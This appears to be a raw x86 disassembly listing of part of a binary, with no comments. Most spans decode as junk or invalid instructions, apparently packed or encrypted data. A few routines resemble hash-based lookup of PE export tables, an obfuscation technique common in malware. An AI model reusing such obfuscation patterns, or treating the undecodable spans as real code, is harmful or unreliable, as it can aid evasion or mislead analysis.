  404180:	or     eax,0xf93806d1
  404185:	mov    bh,0xd4
  404187:	jmp    0x8bf8d571
  40418c:	pop    edi
  40418d:	lea    esi,[ebp+0x7]
  404190:	jle    0x404177
  404192:	xchg   esp,eax
  404193:	idiv   DWORD PTR [ebp-0x64ef7b73]
  404199:	jb     0x4041cd
  40419b:	add    BYTE PTR [ecx+0x45ff0845],cl
  4041a1:	or     al,0xe9
  4041a3:	arpl   ax,di
  4041a5:	(bad)  
  4041a6:	dec    DWORD PTR [ebx-0x3ecc0fbb]
  4041ac:	mov    ecx,DWORD PTR [ebp+0x10]
  4041af:	add    eax,esi
  4041b1:	mov    DWORD PTR [ecx],eax
  4041b3:	pop    esi
  4041b4:	leave  
  4041b5:	ret    0xc
  4041b8:	push   ebp
  4041b9:	mov    ebp,esp
  4041bb:	push   ecx
  4041bc:	push   ecx
  4041bd:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  4041c4:	jmp    0x404388
  4041c9:	call   0xb2b3:0xa7939f83
  4041d0:	mov    bl,0x67
  4041d2:	ja     0x4041f1
  4041d4:	pop    esp
  4041d5:	ret    
  4041d6:	fwait
  4041d7:	xchg   esp,eax
  4041d8:	rcl    DWORD PTR [edx+0x1b],0x7e
  4041dc:	jle    0x404177
  4041de:	jg     0x40425e
  4041e0:	jle    0x40420e
  4041e2:	(bad)  
  4041e3:	pop    ecx
  4041e4:	mov    esi,0x689b88c6
  4041e9:	inc    esp
  4041ea:	stc    
  4041eb:	and    bl,BYTE PTR [esi+0x4a]
  4041ee:	sbb    BYTE PTR [ebx-0x23],0xd8
  4041f2:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  4041f4:	fcom   DWORD PTR [ebp+edi*4-0x29]
  4041f8:	push   ebp
  4041f9:	mov    WORD PTR [ebx+edi*2+0x8],ss
  4041fd:	je     0x4041d6
  4041ff:	pushf  
  404200:	pop    es
  404201:	push   ebp
  404202:	in     eax,0xf
  404204:	pop    ebx
  404205:	rcr    dl,cl
  404207:	cmp    ah,0xbf
  40420a:	imul   ebx,esp,0x27
  40420d:	pop    es
  40420e:	fst    DWORD PTR [edx+0x1c]
  404211:	das    
  404212:	aam    0x34
  404214:	cmp    al,0x6e
  404216:	xchg   esp,eax
  404217:	sti    
  404218:	ds aam 0x50
  40421b:	mov    dh,0x8b
  40421d:	lahf   
  40421e:	push   esp
  40421f:	les    ebx,FWORD PTR [ebp-0x797dcc5]
  404225:	pop    ss
  404226:	bnd jb 0x4042a2
  404229:	adc    BYTE PTR [edi],bl
  40422b:	(bad)
  40422f:	(bad)  
  404230:	por    mm4,QWORD PTR [edx]
  404233:	jbe    0x404215
  404235:	and    eax,0x9cb80e53
  40423a:	leave  
  40423b:	stos   DWORD PTR es:[edi],eax
  40423c:	pop    esp
  40423d:	add    DWORD PTR [ebx],ecx
  40423f:	cmp    al,0x5f
  404241:	ficomp DWORD PTR [esi+eax*1]
  404244:	or     al,cl
  404246:	ins    BYTE PTR es:[edi],dx
  404247:	aam    0xb8
  404249:	sbb    bh,BYTE PTR [edx]
  40424b:	bound  ebp,QWORD PTR [ecx]
  40424d:	pop    ss
  40424e:	pop    ebx
  40424f:	fwait
  404250:	sbb    eax,0xd9131b06
  404255:	mov    dh,BYTE PTR ds:0xfaa9ea47
  40425b:	push   esi
  40425c:	push   edx
  40425d:	call   0xc2ce:0x6fc4bc9
  404264:	add    ch,ch
  404266:	push   edi
  404267:	sub    BYTE PTR [edx-0x46b57875],cl
  40426d:	rol    DWORD PTR [eax+esi*8],cl
  404270:	mov    ah,0x9e
  404272:	or     DWORD PTR [edi],0xffffffdb
  404275:	hlt    
  404276:	xchg   edx,eax
  404277:	aas    
  404278:	push   ebp
  404279:	xchg   cl,bl
  40427b:	pop    ss
  40427c:	fwait
  40427d:	in     al,dx
  40427e:	push   esp
  40427f:	push   ss
  404280:	add    esp,eax
  404282:	dec    ecx
  404283:	cli    
  404284:	jne    0x404232
  404286:	jle    0x404284
  404288:	stos   DWORD PTR es:[edi],eax
  404289:	data16 jecxz 0x4042c0
  40428c:	or     esp,DWORD PTR [esi]
  40428e:	int    0xcc
  404290:	inc    ecx
  404291:	jo     0x40429b
  404293:	clc    
  404294:	std    
  404295:	fisttp QWORD PTR [esi+0x3a]
  404298:	jmp    0x404262
  40429a:	ja     0x404276
  40429c:	jae    0x40422d
  40429e:	mov    DWORD PTR [edi-0x1213296],esp
  4042a4:	jnp    0x40431e
  4042a6:	(bad)
  4042a9:	add    al,0x1d
  4042ab:	test   eax,0xf3f2f33
  4042b0:	(bad)  
  4042b1:	mov    cl,0x1c
  4042b3:	cmp    DWORD PTR [eax-0x7c2ea35e],ecx
  4042b9:	sahf   
  4042ba:	xchg   esp,eax
  4042bb:	pop    ebx
  4042bc:	xor    eax,0x5c2a277
  4042c1:	pushf  
  4042c2:	and    cl,al
  4042c4:	pop    edi
  4042c5:	imul   esp,edx,0x4c889817
  4042cb:	mov    ds:0x3257702e,eax
  4042d0:	stc    
  4042d1:	push   0xffffff85
  4042d3:	leave  
  4042d4:	jg     0x4042ce
  4042d6:	das    
  4042d7:	mov    al,ds:0x2466994b
  4042dc:	enter  0x249a,0xca
  4042e0:	mov    al,0x4e
  4042e2:	adc    BYTE PTR [edi+0x39],dl
  4042e5:	loopne 0x40430b
  4042e7:	test   eax,0x54e2a993
  4042ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4042ed:	sub    BYTE PTR [ecx],al
  4042ef:	loop   0x404353
  4042f1:	adc    eax,0x9e7b6433
  4042f6:	pop    ds
  4042f7:	adc    DWORD PTR [ebx+0x5a57fc26],esp
  4042fd:	mov    eax,0xeaea2455
  404302:	add    edx,DWORD PTR [eax+esi*4]
  404305:	out    dx,eax
  404306:	push   cs
  404307:	or     DWORD PTR [edi+0x15ac513a],esp
  40430d:	lods   al,BYTE PTR ds:[esi]
  40430e:	adc    eax,DWORD PTR [edx]
  404310:	frstor [eax-0x1cc251c9]
  404316:	xchg   ebx,eax
  404317:	pop    ecx
  404318:	jbe    0x40432b
  40431a:	or     DWORD PTR [ebx-0x13],0xffffffc3
  40431e:	das    
  40431f:	push   edi
  404320:	aas    
  404321:	adc    eax,esp
  404323:	stos   BYTE PTR es:[edi],al
  404324:	es inc edi
  404326:	or     eax,0xb0d02b77
  40432b:	imul   eax,DWORD PTR [edi],0xffffff90
  40432e:	adc    BYTE PTR [eax+0x76059df4],cl
  404334:	mov    ds:0x461d81d,al
  404339:	add    edi,0xffffffb2
  40433c:	mov    esi,0x18700758
  404341:	stc    
  404342:	xchg   ebx,eax
  404343:	add    DWORD PTR [edi+eax*2-0x4f],ebp
  404347:	jnp    0x4042c9
  404349:	aam    0xb8
  40434b:	adc    edx,DWORD PTR [ebx-0x5b]
  40434e:	xor    BYTE PTR [edi],0x3d
  404351:	sbb    eax,0x381456aa
  404356:	js     0x404304
  404358:	fcom   QWORD PTR [eax+0x276b6509]
  40435e:	lea    edi,[edx+edi*4-0x52]
  404362:	mov    bl,0xa6
  404364:	sub    al,0x7e
  404366:	cdq    
  404367:	cld    
  404368:	std    
  404369:	push   ebx
  40436a:	mov    DWORD PTR [ecx],edi
  40436c:	xchg   esi,eax
  40436d:	xchg   ebx,eax
  40436e:	mov    ebp,0x908e65cf
  404373:	sub    DWORD PTR [ecx+0x2cb3f92e],0xffffffd6
  40437a:	or     BYTE PTR [eax+0xa],bl
  40437d:	xor    BYTE PTR [ebx+0x1751811],ah
  404383:	std    
  404384:	iret   
  404385:	cmp    BYTE PTR [edx+ecx*1-0x39],bh
  404389:	inc    ebp
  40438a:	cld    
  40438b:	xor    al,BYTE PTR [ebp+0x458bf89c]
  404391:	cld    
  404392:	push   esi
  404393:	or     DWORD PTR ds:0x42ec6f,0x42e640
  40439d:	mov    esi,DWORD PTR [ebp-0x8]
  4043a0:	and    DWORD PTR ds:0x42ec67,edi
  4043a6:	mov    edx,0x7510854
  4043ab:	or     DWORD PTR ds:0x4302b5,0x1aa0
  4043b5:	xor    eax,edx
  4043b7:	add    DWORD PTR ds:0x42ec6f,0x4302b5
  4043c1:	xor    esi,edx
  4043c3:	mov    ecx,0x32729b
  4043c8:	or     DWORD PTR ds:0x43035f,0x42e648
  4043d2:	add    esi,ecx
  4043d4:	add    eax,ecx
  4043d6:	sub    DWORD PTR ds:0x42e64c,0x70e
  4043e0:	imul   eax,esi
  4043e3:	mov    esi,0x43d2
  4043e8:	mov    esi,DWORD PTR [ebp+0xc]
  4043eb:	cmp    esi,eax
  4043ed:	jne    0x4045f5
  4043f3:	mov    eax,DWORD PTR [ebp-0x4]
  4043f6:	mov    esi,DWORD PTR [ebp-0x8]
  4043f9:	xor    DWORD PTR ds:0x42ec63,0x42ec6b
  404403:	xor    eax,edx
  404405:	and    DWORD PTR ds:0x42ec6b,0x3e0c
  40440f:	xor    esi,edx
  404411:	xor    DWORD PTR ds:0x4302cd,0x798f
  40441b:	jmp    0x4045df
  404420:	jbe    0x40448b
  404422:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404423:	adc    eax,0x6974d1a1
  404428:	sahf   
  404429:	es push 0x79
  40442c:	retf   0x643d
  40442f:	(bad)  
  404431:	sbb    DWORD PTR [esi+0x7e],edi
  404434:	cdq    
  404435:	jg     0x4044b5
  404437:	jle    0x404493
  404439:	test   eax,0x3e00b58
  40443e:	mov    ch,0xab
  404440:	mov    ds,esp
  404442:	stc    
  404443:	loope  0x4043f4
  404445:	lods   eax,DWORD PTR ds:[esi]
  404446:	inc    edi
  404447:	jmp    0x33873d2
  40444c:	adc    eax,edi
  40444e:	xchg   DWORD PTR [ecx+0x47],edx
  404451:	(bad)  
  404452:	mov    edi,0xf30681e9
  404457:	or     bl,BYTE PTR [ebx-0x4b]
  40445a:	adc    eax,0x2ad54047
  40445f:	mov    al,0x4
  404461:	ins    DWORD PTR es:[edi],dx
  404462:	ret    
  404463:	out    0x99,eax
  404465:	inc    edi
  404466:	inc    edi
  404467:	popa   
  404468:	ds adc BYTE PTR es:[ebp+0x2c],0xe5
  40446e:	pop    edx
  40446f:	test   DWORD PTR [edx+0x20764af4],ecx
  404475:	sahf   
  404476:	inc    eax
  404477:	xchg   ecx,eax
  404478:	xchg   BYTE PTR [edi+0x33c874b9],dl
  40447e:	out    0xb6,eax
  404480:	add    bh,BYTE PTR [esi]
  404482:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404483:	shr    BYTE PTR [ebp+0x39],0x30
  404487:	ja     0x404464
  404489:	in     al,dx
  40448a:	push   0x75a3d2ac
  40448f:	cmc    
  404490:	adc    al,0xcf
  404492:	in     al,0x35
  404494:	push   ss
  404495:	cdq    
  404496:	sub    eax,0x9987c907
  40449b:	fadd   QWORD PTR [eax+eiz*8-0x59]
  40449f:	lahf   
  4044a0:	fmul   DWORD PTR [edx]
  4044a2:	stos   BYTE PTR es:[edi],al
  4044a3:	clc    
  4044a4:	loope  0x40448f
  4044a6:	inc    esi
  4044a7:	data16 lods al,BYTE PTR ds:[esi]
  4044a9:	jbe    0x404529
  4044ab:	jne    0x4044f6
  4044ad:	jne    0x404512
  4044af:	jge    0x4044e1
  4044b1:	(bad)  
  4044b2:	mov    eax,ds:0xade1460
  4044b7:	mov    edx,0x6a5386ec
  4044bc:	lods   eax,DWORD PTR ds:[esi]
  4044bd:	cmp    ah,ah
  4044bf:	and    esp,eax
  4044c1:	enter  0xd239,0xf0
  4044c5:	push   cs
  4044c6:	xchg   esi,eax
  4044c7:	cwde   
  4044c8:	xchg   BYTE PTR [eax],dh
  4044ca:	xchg   ecx,eax
  4044cb:	aaa    
  4044cc:	add    bh,BYTE PTR [edi-0x213edf15]
  4044d2:	sub    ebp,DWORD PTR [eax+esi*1+0x1a729f6e]
  4044d9:	push   DWORD PTR ds:[ecx+edx*2-0x7b]
  4044de:	mov    ?,WORD PTR [ebx+ebx*4-0x4e]
  4044e2:	pop    ecx
  4044e3:	popa   
  4044e4:	scas   al,BYTE PTR es:[edi]
  4044e5:	add    DWORD PTR [ecx+0x4],edx
  4044e8:	jmp    DWORD PTR ds:0xd7f7bfcf
  4044ee:	retf   
  4044ef:	mov    ch,0xac
  4044f1:	retf   0x6542
  4044f4:	and    al,0x6d
  4044f6:	sbb    eax,0x467c80a8
  4044fb:	push   ebp
  4044fc:	repz aam 0x78
  4044ff:	gs scas al,BYTE PTR es:[edi]
  404501:	call   0xf2e0:0x635abb0f
  404508:	cmp    edi,DWORD PTR [ecx+ebx*1]
  40450b:	push   ebx
  40450c:	push   es
  40450d:	sub    eax,0xd88722fe
  404512:	popf   
  404513:	dec    esi
  404514:	mov    bh,0x43
  404516:	sub    ecx,DWORD PTR [ebx+0x45]
  404519:	xor    ah,dh
  40451b:	jmp    0x40454c
  40451d:	shr    DWORD PTR [ecx+0x6a8901aa],1
  404523:	xchg   edi,eax
  404524:	test   DWORD PTR [edi-0x27],edi
  404527:	and    DWORD PTR [edx],edx
  404529:	cwde   
  40452a:	cmc    
  40452b:	(bad)  
  40452c:	fnstenv [ecx+0x11]
  40452f:	cmp    esp,0xc6755c6d
  404535:	mov    esp,0xc2c7e3d6
  40453a:	icebp  
  40453b:	jns    0x40456c
  40453d:	xchg   edi,eax
  40453e:	add    dh,BYTE PTR [ecx-0x7b9e6f0b]
  404544:	pusha  
  404545:	data16 sub dh,BYTE PTR [ebx+0x118b0b82]
  40454c:	xor    BYTE PTR [eax],al
  40454e:	lea    edx,[edi]
  404550:	jp     0x4044d7
  404552:	out    dx,eax
  404553:	sbb    esp,eax
  404555:	test   al,0x73
  404557:	pusha  
  404558:	fwait
  404559:	imul   DWORD PTR [ebx]
  40455b:	pop    ecx
  40455c:	pop    es
  40455d:	jl     0x404553
  40455f:	inc    esi
  404560:	rcr    BYTE PTR [ecx+0x22cc50cc],cl
  404566:	cdq    
  404567:	out    0xc1,al
  404569:	pop    es
  40456a:	test   DWORD PTR [ebx],0x8a0da9c4
  404570:	and    bl,BYTE PTR [ebp+ebx*2+0x38688e58]
  404577:	cmp    BYTE PTR ds:0x3664bb57,0x9f
  40457e:	fs mov dh,0x3f
  404581:	jp     0x4045da
  404583:	addr16 out 0xa6,al
  404586:	xor    DWORD PTR [eax],esi
  404588:	clc    
  404589:	xchg   esp,eax
  40458a:	push   esp
  40458b:	es push 0xa7683884
  404591:	xor    eax,0x71d77b8c
  404596:	(bad)  
  404597:	or     BYTE PTR [edi+edx*2+0x6cb29daa],al
  40459e:	data16 test al,0x14
  4045a1:	mov    eax,ds:0x3b01e822
  4045a6:	rol    eax,0x3f
  4045a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4045aa:	or     bl,cl
  4045ac:	push   ebp
  4045ad:	in     al,0xd1
  4045af:	fs aad 0xc6
  4045b2:	or     eax,0xe951f6b0
  4045b7:	sub    DWORD PTR [esp+esi*4-0x2899e84a],ebx
  4045be:	pop    ebx
  4045bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4045c0:	fdiv   DWORD PTR [esi+0x3c588668]
  4045c6:	popa   
  4045c7:	xchg   BYTE PTR [esi],al
  4045c9:	fst    DWORD PTR [ecx]
  4045cb:	xchg   ecx,eax
  4045cc:	pusha  
  4045cd:	xchg   esi,eax
  4045ce:	jecxz  0x4045b2
  4045d0:	push   cs
  4045d1:	stos   DWORD PTR es:[edi],eax
  4045d2:	mov    WORD PTR [eax-0x47],gs
  4045d5:	jge    0x404642
  4045d7:	jne    0x4045ad
  4045d9:	add    al,0xd4
  4045db:	xor    ebp,DWORD PTR [esi-0x34]
  4045de:	in     eax,dx
  4045df:	add    eax,ecx
  4045e1:	add    esi,ecx
  4045e3:	imul   eax,esi
  4045e6:	mov    DWORD PTR ds:0x430367,0x2c81
  4045f0:	jmp    0x4046a8
  4045f5:	and    DWORD PTR ds:0x4302b9,0x0
  4045ff:	jmp    0x404612
  404604:	xor    eax,eax
  404606:	xor    eax,DWORD PTR ds:0x4302b9
  40460c:	inc    eax
  40460d:	mov    ds:0x4302b9,eax
  404612:	cmp    DWORD PTR ds:0x4302b9,0x18
  404619:	jae    0x40466d
  40461f:	cmp    DWORD PTR ds:0x4302b9,0xd
  404626:	jne    0x404650
  40462c:	push   0x4871
  404631:	push   0x7618
  404636:	push   0x847f
  40463b:	push   DWORD PTR [ebp-0x1c]
  40463e:	push   DWORD PTR [ebp-0xc]
  404641:	push   DWORD PTR [ebp-0x14]
  404644:	push   DWORD PTR [ebp-0x10]
  404647:	push   DWORD PTR [ebp-0x10]
  40464a:	call   DWORD PTR ds:0x42ea93
  404650:	cmp    DWORD PTR ds:0x4302b9,0xc
  404657:	jne    0x404668
  40465d:	mov    eax,ds:0x4302b9
  404662:	inc    eax
  404663:	mov    ds:0x4302b9,eax
  404668:	jmp    0x404604
  40466d:	mov    eax,DWORD PTR [ebp+0xc]
  404670:	mov    eax,DWORD PTR [eax+0x78]
  404673:	mov    DWORD PTR [ebp+0xc],eax
  404676:	mov    eax,DWORD PTR [ebp-0x4]
  404679:	mov    esi,DWORD PTR [ebp-0x8]
  40467c:	xor    eax,edx
  40467e:	xor    esi,edx
  404680:	add    eax,ecx
  404682:	add    esi,ecx
  404684:	imul   eax,esi
  404687:	mov    esi,DWORD PTR [ebp+0xc]
  40468a:	cmp    esi,eax
  40468c:	mov    eax,DWORD PTR [ebp-0x4]
  40468f:	je     0x4043f6
  404695:	xor    eax,edx
  404697:	add    eax,ecx
  404699:	mov    ecx,DWORD PTR [ebp+0xc]
  40469c:	imul   eax,ecx
  40469f:	add    eax,DWORD PTR [ebp+0x8]
  4046a2:	mov    DWORD PTR [ebp+0xc],eax
  4046a5:	mov    eax,DWORD PTR [ebp+0xc]
  4046a8:	pop    esi
  4046a9:	leave  
  4046aa:	ret    0x8
  4046ad:	push   ebp
  4046ae:	mov    ebp,esp
  4046b0:	push   ecx
  4046b1:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  4046b8:	mov    DWORD PTR ds:0x42ec53,0x122d
  4046c2:	mov    eax,DWORD PTR [ebp-0x4]
  4046c5:	mov    edx,DWORD PTR [ebp+0x10]
  4046c8:	mov    ecx,0x7510854
  4046cd:	sbb    DWORD PTR ds:0x4302b9,0x4302f1
  4046d7:	xor    eax,ecx
  4046d9:	sub    DWORD PTR ds:0x4302dd,0x42ec5b
  4046e3:	add    eax,0x32729b
  4046e8:	jmp    0x4049a4
  4046ed:	fnstenv [eax+0x4]
  4046f0:	loop   0x404687
  4046f2:	jb     0x4046cd
  4046f4:	jno    0x40470f
  4046f6:	in     eax,0x6e
  4046f8:	jne    0x404691
  4046fa:	jp     0x404764
  4046fc:	daa    
  4046fd:	and    al,0x27
  4046ff:	jle    0x40477f
  404701:	xchg   ecx,eax
  404702:	jl     0x404782
  404704:	jle    0x4046c9
  404706:	jg     0x40474f
  404708:	call   0xd34dc50a
  40470d:	cmp    edx,0x14
  404710:	jl     0x4046a8
  404712:	clc    
  404713:	sub    eax,0x96b9390c
  404718:	xchg   edx,eax
  404719:	xchg   ecx,eax
  40471a:	rcr    DWORD PTR [eax-0x65b84126],0x78
  404721:	fcom   QWORD PTR [ebp+0x189a257a]
  404727:	hlt    
  404728:	pop    ebp
  404729:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40472a:	xchg   ebp,eax
  40472b:	push   eax
  40472c:	push   ss
  40472d:	addr16 in al,dx
  40472f:	dec    eax
  404730:	inc    edi
  404731:	pop    ecx
  404732:	sbb    al,0xb8
  404734:	xor    ecx,DWORD PTR [ebx-0x3d]
  404737:	fcomp  QWORD PTR [ebx+0x2f]
  40473a:	mov    ebp,0xef6446e0
  40473f:	and    esi,DWORD PTR [ebp+0xe]
  404742:	out    dx,al
  404743:	pop    es
  404744:	shl    al,0x20
  404747:	cmp    al,0x67
  404749:	jne    0x404799
  40474b:	xchg   esi,eax
  40474c:	mov    esp,0x14def99a
  404751:	test   eax,0xd97e255e
  404756:	fld    QWORD PTR [edx+0x643e7f37]
  40475c:	cmp    BYTE PTR [esi-0x4af19fb3],cl
  404762:	fidiv  DWORD PTR [edx+0x6d08d12d]
  404768:	mov    dh,0xbd
  40476a:	lea    esp,ds:0xbada8784
  404770:	shr    DWORD PTR [ebp+0x42],1
  404773:	bound  edx,QWORD PTR [ebp-0x7aa36c43]
  404779:	or     ecx,DWORD PTR cs:[ebx-0x5a]
  40477d:	inc    eax
  40477e:	imul   ebp,ecx,0x1553d21c
  404784:	or     esp,DWORD PTR [eax-0x325f1266]
  40478a:	js     0x404802
  40478c:	mov    bh,0xb1
  40478e:	outs   dx,DWORD PTR ds:[esi]
  40478f:	fs icebp 
  404791:	data16 xor al,0x2b
  404794:	xor    eax,0xd014b124
  404799:	sahf   
  40479a:	push   ebx
  40479b:	xor    ah,ch
  40479d:	xchg   ebx,eax
  40479e:	cmp    DWORD PTR [eax-0x2d7b85e],edi
  4047a4:	pop    esi
  4047a5:	out    dx,eax
  4047a6:	jecxz  0x4047d9
  4047a8:	stos   BYTE PTR es:[edi],al
  4047a9:	push   ebp
  4047aa:	jne    0x404798
  4047ac:	or     eax,0x36b07c6a
  4047b1:	xchg   ecx,eax
  4047b2:	push   edx
  4047b3:	adc    eax,0x8714d6c9
  4047b8:	out    dx,eax
  4047b9:	xchg   esi,eax
  4047ba:	inc    esi
  4047bb:	fs push 0x52
  4047be:	jb     0x404753
  4047c0:	or     DWORD PTR [ecx-0x6b135584],0x2c
  4047c7:	push   0xd0756012
  4047cc:	dec    edx
  4047cd:	push   edi
  4047ce:	jnp    0x40478b
  4047d0:	dec    esi
  4047d1:	xor    DWORD PTR [edi],ebx
  4047d3:	jmp    0x4047a0
  4047d5:	jp     0x40476d
  4047d7:	adc    esi,esp
  4047d9:	inc    edx
  4047da:	sub    al,BYTE PTR [eax+0x66595c05]
  4047e0:	sbb    BYTE PTR [eax],bl
  4047e2:	push   eax
  4047e3:	cld    
  4047e4:	(bad)  
  4047e5:	stos   BYTE PTR es:[edi],al
  4047e6:	mov    ch,0x79
  4047e8:	inc    eax
  4047e9:	imul   edi,DWORD PTR ds:0x602ee8e0,0x3e
  4047f0:	iret   
  4047f1:	xchg   ebx,eax
  4047f2:	push   0xea220d2b
  4047f7:	sub    eax,0xc0446f8
  4047fc:	sub    BYTE PTR [eax],0xeb
  4047ff:	mov    es,WORD PTR [edi+0xa9adb84]
  404805:	nop
  404806:	jge    0x4047a4
  404808:	adc    eax,0xc6f4a6b7
  40480d:	test   dh,bl
  40480f:	loop   0x404803
  404811:	call   0xbad4:0x9d1d7eff
  404818:	(bad)  
  404819:	out    dx,eax
  40481a:	dec    edx
  40481b:	mul    BYTE PTR [eax]
  40481d:	cld    
  40481e:	cwde   
  40481f:	mov    ebp,0xb6c77b9c
  404824:	hlt    
  404825:	sub    al,0x24
  404827:	aam    0xe2
  404829:	ret    
  40482a:	adc    BYTE PTR [eax-0x7a],0xe6
  40482e:	sub    eax,0x76898751
  404833:	xlat   BYTE PTR ds:[ebx]
  404834:	aam    0xfb
  404836:	inc    ebp
  404837:	jns    0x4047cb
  404839:	fnstsw WORD PTR [ebx-0x160a7d84]
  40483f:	add    al,0x27
  404841:	inc    eax
  404842:	push   es
  404843:	(bad)  
  404845:	push   0xe10a26e7
  40484a:	and    eax,0x658a63b
  40484f:	out    0x6b,al
  404851:	mov    bh,BYTE PTR [edx+0x240f1d37]
  404857:	pop    esp
  404858:	and    eax,0x7884697
  40485d:	pop    esi
  40485e:	dec    ecx
  40485f:	xlat   BYTE PTR ds:[ebx]
  404860:	addps  xmm2,xmm7
  404863:	sub    BYTE PTR [ecx],bl
  404865:	(bad)  
  404866:	pop    ebx
  404867:	call   0x4b33:0xcc55c8f6
  40486e:	mov    esp,0x44099235
  404873:	push   es
  404874:	retf   0xc510
  404877:	adc    al,0x1c
  404879:	xchg   ecx,eax
  40487a:	es mov ebx,0xc230dd82
  404880:	xchg   edx,eax
  404881:	and    ebx,DWORD PTR ds:0x3acf30da
  404887:	xchg   DWORD PTR [esi],edi
  404889:	and    ah,cl
  40488b:	jo     0x404874
  40488d:	int    0xdc
  40488f:	inc    edi
  404890:	adc    BYTE PTR [esp+ecx*2-0x1b],bh
  404894:	xchg   ebp,eax
  404895:	in     eax,dx
  404896:	ror    esp,0xfc
  404899:	dec    bh
  40489b:	std    
  40489c:	mov    dh,BYTE PTR [eax]
  40489e:	test   DWORD PTR [eax],edi
  4048a0:	(bad)  
  4048a1:	ins    BYTE PTR es:[edi],dx
  4048a2:	cmp    al,0xca
  4048a4:	hlt    
  4048a5:	dec    edi
  4048a6:	outs   dx,DWORD PTR ds:[esi]
  4048a7:	lods   al,BYTE PTR ds:[esi]
  4048a8:	cli    
  4048a9:	les    ebp,FWORD PTR [ebx-0x67a10928]
  4048af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4048b0:	mov    bh,0x4d
  4048b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4048b3:	fadd   st(0),st
  4048b5:	mov    esi,0xc58029c3
  4048ba:	fdivr  QWORD PTR [edi-0x31]
  4048bd:	cld    
  4048be:	les    ecx,FWORD PTR [esi]
  4048c0:	inc    ebp
  4048c1:	push   edx
  4048c2:	mov    esp,0x531bcd33
  4048c7:	push   ebp
  4048c8:	pop    esi
  4048c9:	repz cmp ch,BYTE PTR ss:0x7fe616aa
  4048d1:	dec    edi
  4048d2:	scas   al,BYTE PTR es:[edi]
  4048d3:	xor    al,0xdf
  4048d5:	adc    BYTE PTR [eax-0x68],bl
  4048d8:	and    eax,0x50e867bc
  4048dd:	popf   
  4048de:	xchg   edi,eax
  4048df:	cmp    DWORD PTR gs:[esi+ebx*4],edi
  4048e3:	in     eax,dx
  4048e4:	dec    eax
  4048e5:	(bad)
  4048e9:	xchg   esi,eax
  4048ea:	fadd   st,st(7)
  4048ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4048ed:	jbe    0x4048eb
  4048ef:	push   edx
  4048f0:	push   es
  4048f1:	or     DWORD PTR [esi-0x15],edi
  4048f4:	bound  eax,QWORD PTR ss:[ebx+0x69e77d05]
  4048fb:	push   ds
  4048fc:	les    edi,FWORD PTR [ebp-0x60]
  4048ff:	(bad)  
  404900:	lods   al,BYTE PTR ds:[esi]
  404901:	dec    ebx
  404902:	cmp    al,0x8b
  404904:	mov    ds:0x1a8bb007,al
  404909:	xor    al,0xaa
  40490b:	push   DWORD PTR [edx+edi*8-0x12]
  40490f:	xchg   edx,eax
  404910:	and    BYTE PTR [ebx-0x6f],dh
  404913:	sbb    al,0x16
  404915:	jge    0x404992
  404917:	xchg   DWORD PTR [ecx+0xc],ebx
  40491a:	aam    0x67
  40491c:	dec    esp
  40491d:	or     BYTE PTR [ebx-0x45],dl
  404920:	cmp    DWORD PTR [eax],esp
  404922:	fidiv  WORD PTR [ebx]
  404924:	aas    
  404925:	cld    
  404926:	xchg   edx,eax
  404927:	fwait
  404928:	cmp    DWORD PTR [ebp+0x78],ecx
  40492b:	inc    eax
  40492c:	xchg   ebx,eax
  40492d:	js     0x40490c
  40492f:	retf   
  404930:	jbe    0x404977
  404932:	outs   dx,BYTE PTR ds:[esi]
  404933:	push   0xb7d67c9f
  404938:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404939:	rcr    BYTE PTR [edx-0x708ce739],cl
  40493f:	xor    bl,BYTE PTR [esi+0x761cce61]
  404945:	stos   DWORD PTR es:[edi],eax
  404946:	or     BYTE PTR [ecx+0x3e],bh
  404949:	sbb    DWORD PTR [eax],esp
  40494b:	es jo  0x4049cd
  40494e:	mov    dl,0x45
  404950:	(bad)  
  404951:	popf   
  404952:	out    dx,al
  404953:	mov    esi,DWORD PTR [ecx]
  404955:	push   cs
  404956:	xchg   DWORD PTR [edx+0x6047feb9],eax
  40495c:	repz pop eax
  40495e:	cmp    BYTE PTR [ebp-0x28],bh
  404961:	cmp    BYTE PTR [edi-0x7b],ah
  404964:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404965:	jnp    0x40496d
  404967:	xchg   BYTE PTR [ebx-0x65a2afc7],dh
  40496d:	and    esi,DWORD PTR [ecx-0x4073e148]
  404973:	push   edi
  404974:	pop    edi
  404975:	sbb    DWORD PTR [esi+0x1b187b8c],edx
  40497b:	rol    DWORD PTR [esi+0x6a5f1ad3],0x6a
  404982:	aad    0x7c
  404984:	dec    esi
  404985:	pop    esp
  404986:	dec    DWORD PTR [ecx-0x3e7702ef]
  40498c:	cs jl  0x4049a3
  40498f:	sbb    DWORD PTR [ebx],edi
  404991:	mov    ch,0xaf
  404993:	(bad)  
  404994:	mov    cl,0xf3
  404996:	add    DWORD PTR [edi-0x73],0x24
  40499a:	sahf   
  40499b:	rcl    DWORD PTR [edi+eax*4+0x715fde82],1
  4049a2:	add    eax,0x81028983
  4049a7:	and    eax,0x42e658
  4049ac:	add    BYTE PTR [eax],al
  4049ae:	add    BYTE PTR [eax],al
  4049b0:	xor    edx,edx
  4049b2:	xor    edx,DWORD PTR ds:0x42e658
  4049b8:	inc    edx
  4049b9:	mov    DWORD PTR ds:0x42e658,edx
  4049bf:	cmp    DWORD PTR ds:0x42e658,0xd
  4049c6:	jne    0x4049da
  4049cc:	push   0x1
  4049ce:	push   DWORD PTR [ebp-0x18]
  4049d1:	push   DWORD PTR [ebp-0xc]
  4049d4:	call   DWORD PTR ds:0x42e84f
  4049da:	cmp    DWORD PTR ds:0x42e658,0xc
  4049e1:	jne    0x4049f4
  4049e7:	mov    edx,DWORD PTR ds:0x42e658
  4049ed:	inc    edx
  4049ee:	mov    DWORD PTR ds:0x42e658,edx
  4049f4:	cmp    DWORD PTR ds:0x42e658,0x1c
  4049fb:	jb     0x4049b0
